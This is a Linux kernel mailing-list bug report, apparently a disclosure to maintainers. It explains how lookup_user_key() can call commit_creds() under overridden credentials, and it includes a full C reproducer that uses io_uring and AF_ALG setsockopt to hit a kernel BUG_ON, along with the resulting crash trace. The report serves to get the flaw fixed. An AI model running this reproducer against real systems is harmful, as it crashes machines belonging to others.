Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 26DC7397699
	for <linux-crypto@vger.kernel.org>; Fri, 11 Sep 2026 17:43:29 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.227.140
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789148611; cv=pass; b=kyDR3ZOVUQ3PtjYs1H+Ds3+x1QwqwMEU/KohZ2dGSUgF75+vN/ZzhiAC0nB0LpELpjdXsvM3x+wF5OKu7yRwuhzE5ABJ2UYQVBJXrWkWEUZMtpLqU5wjgaEGGNQc8J2UhG43ctcqKBLLgkuyGqkSIx9DiXY++POALV4S3z6WUQ0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789148611; c=relaxed/simple;
	bh=FjAxvxeArT6oGSMgJeJbHTSWRefCPbjzTtOgKthZtsY=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=sTOhGL2aFF3Ig+NLlakh5qjGT/X/xg4fiQrfyJX2BqeskkZqGaCJuTuui9ak9hxes5w9ywrv5wBfL9c+yC2eizYSX3GORZX+hpyGeg//kYOMq2dFvfDDwSKRsaH13hfHsfkWVIVId82qoKW/LQ0AqjqodVoF4xTrWu5W7I5jjfc=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=CQmtgcwE; arc=pass smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="CQmtgcwE"
Received: by mail-pj2-f12.google.com with SMTP id d9443c01a7336-2db425c9050so32085ad.0
        for <linux-crypto@vger.kernel.org>; Fri, 11 Sep 2026 10:43:29 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1789148609; cv=none;
        d=google.com; s=arc-20260327;
        b=Zk8K0bqY8KmoouxI3CjNTTGAEMzsusOwaJsuXsoTjCyEqrF7ek45pb4PqNEw1jKxCf
         jOECgrVXwPMroDZhlcMWjBr6irUxqcKJU+VTUq+5EnsdvVVcP0aQZ0AmyhPyLeQe/cVW
         5XeRYQS1tZf8HlWdtYljXb6C5WfgvDWHxQ/bMK6quigSqkA3woi2qTm52ZEqmsKh9lyb
         /LkTL/1h0zqgJ7PjEaRD/ICMDCAiO6lK6919VZRMAHHwIlGwV1e//6RxTGE7j0GDOo/3
         i7lKhDq9UvAbV13X8GS6YsP+0kEW689HOA5lrMg16hG1cWeI56cqnESfcpC+6J7OTovi
         6uBw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=r5WUKHjjmdQ6lLL56J9wrBm7xGwf/SHC1lNhlHRvsuE=;
        fh=0IWZN4XemSKTSAsG2A/YtJAlf+oWEoG8Ns3W3fBZOsk=;
        b=p+I02dbdSTXdvbQr40GTtdw003S54iw+Rcty46IO6LzvgiJCFJjPXZbsPsulucVUJ9
         VMzS7FMkGLkIB0dJFzgO7xusUVyEBRwQiI0iWYBV5KYKRe/8AmmrsafwQpCu12ZCXWxV
         JZNzzAX3C1AFBOkh2LpTLStB+H8aTOdHEDRD+9QjFUY/ywM2Ou/AvprLBvEr6Zt/0Cqn
         DN/gcmAFee0t+Y19UsTgeZSDfASDWM55kjStw1USsLiUd8MqLowOAKHun3dQQOnFoxWk
         2jpnp9+r5T80L9QDI1U8HXh13uglOp29eQdA7ymB9+Mq7hf4/iNXJ7pU6G1RjF+qAThh
         98Ag==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20251104; t=1789148609; x=1789753409; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:mime-version:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=r5WUKHjjmdQ6lLL56J9wrBm7xGwf/SHC1lNhlHRvsuE=;
        b=CQmtgcwEXtjJw/b/O33kch8EFg1Q4NIzOGw0ebbcIRIqFjL73yx4GBtxM+wM9Tkwk6
         BNnqUwrV9VvA+e6CtDE4sdTPPo6YVrUYFETIYJH1+MHQYdoFPukaN8g2mdrV7nUUbpYZ
         EmcGm5SqdMLqSa9s9jrks/ByvrqtTh/L/yWp2iczr1oNBSf2jGjz5vhfQd6PKLREiLLj
         woQ1UaCl0384imXlbxSHksqbvcauPLnXUWvbyDYPmIAFK+BKWWYoEmLNY2E81Cp8SOh+
         qV0p0ycozpVtfN5CWZuB1WKwvMLQ8IPLvnJc6Mg1JNdgQ8GJAT+0ahhHx8R1eit0yxDP
         ZF5Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789148609; x=1789753409;
        h=content-type:cc:to:subject:message-id:date:from:mime-version
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=r5WUKHjjmdQ6lLL56J9wrBm7xGwf/SHC1lNhlHRvsuE=;
        b=kWhC9PhNAvKI/5kvGEb+Gp6O4Dq4s4/iqcWWLOhl5wePN3U7FGPq6GHym1ArAqlzA8
         JMe6QkON3NqmiChaJDU/HctPq/awoHEdxN95lNroARi+sMM+nm661PC3Ouh9NAdFVeY/
         HEqKqb/ePSGpdYqc4oX26EWOsmmquc8qGLOEyEp2b+owMujWvaSv8bVYr3Ne4rF4F7E4
         JwA81Zs0NKwvw0kC+0tIo+VI6fCKwRCgG75tGxrPlpHQ+RkMsY3hKptHJdkKYLdLdv+7
         NlCjKdb7x6LQe/8Ups/lMSCkglE4Wcqq/b4W9YOT5aWk7c3DOYRsxs943EBxpu+Ua14J
         4kkg==
X-Forwarded-Encrypted: i=1; AKwUvBz0ZQqXcEjnBGKCZY4HQ3xFPJkLk1oLcpQJVDRdDy1QBQUH7RTlZI25hO5nBf8UgTlWGi0rHF8cdfgmYn4=@vger.kernel.org
X-Gm-Message-State: AFuF++mivJhsLq0A4c1vqfmZONyQFIfI31/YgndUNAJdXlJGlZHzOmjM
	uWEZo5mmuabtLVKZkvi0FMFsj7e1kZqQ3xFgURL8/8NIo/63+BnoZbejMfJtHBw27jqxP1onM18
	ufasUj4cWRJPq3voWJimgB4TQnhM0nwiMq1rlziH9
X-Gm-Gg: AYBFou11no4nDtwUoREjHFqk1sx4DZhidN73lkOShYtf6U19W/HBQGiVViCspjdjA2c
	ys/QAf+5gqZbIzmSlG4p1LLRSgTQ01LmdxepitDVDFOv7ZToR+H9dI02Cw6aT5PGS8U6Solho+8
	wuFBJJ8exYJf849MsjY9yKDNbee+WB91CoyNUtouJBfgBGB51XJBPG8mwRzqVJ30S/U+MZEwx0r
	kQMIXzWnQtRQuX5B9GmEFuLHp0rja8znWRSmlcdiKU4eYzuGeZDLFz7evfGJSnjOLXR5j8Kb+xf
	TAhB/BfYzsGVNkVDV1HNMVoUPXrNZIAmNN40Wg4oqtZn+YRGTymvfh00vgOA5m1TweG6Ssukfge
	2Q5wiY4Ui2biWB+0vqW5LUdB9usGD8jS6qzh5Jiq6mw==
X-Received: by 2002:a17:903:90f:b0:2cf:4353:f117 with SMTP id
 d9443c01a7336-2dd47920cc3mr593535ad.0.1789148608672; Fri, 11 Sep 2026
 10:43:28 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-crypto@vger.kernel.org
List-Id: <linux-crypto.vger.kernel.org>
List-Subscribe: <mailto:linux-crypto+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-crypto+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Jann Horn <jannh@google.com>
Date: Fri, 11 Sep 2026 19:42:50 +0200
X-Gm-Features: AcwNN1UEsmAp1ZpjAO5SabZLRYOJVSonFCV3Y-4hFZyv2l_DuysDWBG1-5bTn4o
Message-ID: <CAG48ez0XjVSR=M--UBauTm8sJuc+ZbhKzaPa3a6wrSVHyoKevw@mail.gmail.com>
Subject: [BUG] lookup_user_key() calls commit_creds() (hitting BUG_ON() when
 called from io_uring through AF_ALG setsockopt; BPF probably also affected)
To: David Howells <dhowells@redhat.com>, Jarkko Sakkinen <jarkko@kernel.org>, keyrings@vger.kernel.org, 
	Roberto Sassu <roberto.sassu@huawei.com>, Kumar Kartikeya Dwivedi <memxor@gmail.com>, Song Liu <song@kernel.org>, 
	Alexei Starovoitov <ast@kernel.org>
Cc: Herbert Xu <herbert@gondor.apana.org.au>, "David S. Miller" <davem@davemloft.net>, 
	linux-crypto@vger.kernel.org, Jens Axboe <axboe@kernel.dk>, 
	io-uring <io-uring@vger.kernel.org>, Daniel Borkmann <daniel@iogearbox.net>, 
	Andrii Nakryiko <andrii@kernel.org>, Eduard Zingerman <eddyz87@gmail.com>, 
	Martin KaFai Lau <martin.lau@linux.dev>, Yonghong Song <yonghong.song@linux.dev>, 
	Jiri Olsa <jolsa@kernel.org>, Emil Tsalapatis <emil@etsalapatis.com>, 
	Ihor Solodrai <ihor.solodrai@linux.dev>, bpf <bpf@vger.kernel.org>
Content-Type: text/plain; charset="UTF-8"

When lookup_user_key() is called on a special keyring ID
(KEY_SPEC_*_KEYRING), it can end up calling commit_creds() on several
codepaths:

lookup_user_key
  install_thread_keyring [KEY_SPEC_THREAD_KEYRING + KEY_LOOKUP_CREATE]
    commit_creds
  install_process_keyring [KEY_SPEC_PROCESS_KEYRING + KEY_LOOKUP_CREATE]
    commit_creds
  join_session_keyring [KEY_SPEC_SESSION_KEYRING + KEY_LOOKUP_CREATE]
    commit_creds
  install_session_keyring [KEY_SPEC_SESSION_KEYRING]
    commit_creds

commit_creds() is only allowed when the process does not have
overridden credentials. commit_creds() also requires that no
non-refcounted pointers obtained from current_cred() are live in any
callers.

lookup_user_key() is used by lots of keyctl operations, where it can
make sense to refer to special keyring IDs; but it is also used by
other subsystems (such as AF_ALG, nvdimm, fscrypt, BPF, ...) to look
up user-specified key IDs. In that case, special keyring IDs don't
make sense (because they refer to keyrings, not individual
cryptographic keys), and calling commit_creds() is unsafe.

It would be nice if we could ensure that commit_creds() can only be
called when KEY_LOOKUP_CREATE is set (which is only used for special
key IDs); maybe we could replace the
install_session_keyring(user_session) call with something that just
grabs a reference to the session keyring and returns it?

I made a reproducer for the lookup_user_key() call in AF_ALG, but I
think several other callers of lookup_user_key() are probably also
affected, like bpf_lookup_user_key() and nvdimm_lookup_user_key().

bpf_lookup_user_key() will probably require separate fixing; it seems
to be intentionally designed to be able to look up and create special
key IDs, but is part of the generic_kfunc_set kfunc set, which can
probably run in some contexts with overridden creds, like in arbitrary
LSM hooks. That seems inherently broken.

Reproducer
==========
As an example, when I use io_uring with ->personality to indirectly
call setsockopt(af_alg_sock, SOL_ALG, ALG_SET_KEY_BY_KEY_SERIAL,
&KEY_SPEC_SESSION_KEYRING, sizeof(int)), the kernel will go down the
following call graph.

sys_io_uring_enter
  io_submit_sqes
    io_submit_sqe
      io_init_req
        [set REQ_F_CREDS if sqe->personality is set]
      io_queue_sqe
        io_issue_sqe
          __io_issue_sqe
            override_creds [if REQ_F_CREDS is set and creds differ]
            io_uring_cmd
              io_uring_cmd_sock
                io_uring_cmd_setsockopt
                  do_sock_setsockopt
                    alg_setsockopt
                      alg_setkey_by_key_serial
                        lookup_key
                          lookup_user_key
                            install_session_keyring
                              commit_creds
                                BUG_ON(task->cred != old)
            revert_creds

Running this reproducer:

#define _GNU_SOURCE
#include <err.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_alg.h>
#include <linux/io_uring.h>
#include <linux/keyctl.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

int main(void) {
  int alg_sock = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
  struct sockaddr_alg addr = {
    .salg_family = AF_ALG,
    .salg_type = "hash",
    .salg_name = "sha1"
  };
  SYSCHK(bind(alg_sock, (struct sockaddr *)&addr, sizeof(addr)));

  struct io_uring_params params = { .flags = IORING_SETUP_NO_SQARRAY };
  int uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/4, &params));

  // let io_uring grab a reference to the current creds
  int personality = SYSCHK(syscall(__NR_io_uring_register, uring_fd,
IORING_REGISTER_PERSONALITY, NULL, 0));
  // change our creds so that the io_uring personality is different
from current creds
  SYSCHK(syscall(__NR_keyctl, KEYCTL_GET_KEYRING_ID,
KEY_SPEC_SESSION_KEYRING, 0, 0, 0));

  char *ring_region = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
  struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000,
PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));

  int key_serial = KEY_SPEC_SESSION_KEYRING;
  sqes[0] = (struct io_uring_sqe) {
    .opcode = IORING_OP_URING_CMD,
    .fd = alg_sock,
    .personality = personality,

    /* specific to uring_cmd */
    .cmd_op = SOCKET_URING_OP_SETSOCKOPT,
    .optname = ALG_SET_KEY_BY_KEY_SERIAL,
    .optval = (unsigned long)&key_serial,
    .optlen = sizeof(key_serial),
    .level = SOL_ALG,
  };
  (*(unsigned int *)(ring_region + params.sq_off.tail))++;

  int submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd,
                                   /*to_submit=*/1, /*min_complete=*/1,
                                   /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0));
  printf("submitted %d and completed\n", submitted);
}


I get this splat:

[  543.190354][  T111] kernel BUG at kernel/cred.c:376!
[...]
[  543.196705][  T111] Call Trace:
[...]
[  543.197319][  T111]  lookup_user_key+0x261/0xbe0
[...]
[  543.197869][  T111]  alg_setkey_by_key_serial+0xbc/0x300
[  543.198153][  T111]  alg_setsockopt+0x1a2/0x2a0
[...]
[  543.198610][  T111]  do_sock_setsockopt+0x103/0x130
[  543.198863][  T111]  io_uring_cmd_sock+0x257/0x8b0
[...]
[  543.199608][  T111]  io_uring_cmd+0x1f3/0x2a0
[...]
[  543.200103][  T111]  __io_issue_sqe+0xd8/0x2a0
[  543.200335][  T111]  io_issue_sqe+0xde/0x8c0
[...]
[  543.201100][  T111]  io_submit_sqes+0x7a6/0x1060
[  543.201380][  T111]  __se_sys_io_uring_enter+0x218/0xf40
[...]
[  543.202158][  T111]  __x64_sys_io_uring_enter+0x82/0xa0
[...]
[  543.202780][  T111]  x64_sys_call+0x175f/0x2600
[  543.203086][  T111]  do_syscall_64+0xbe/0x360
[  543.203348][  T111]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
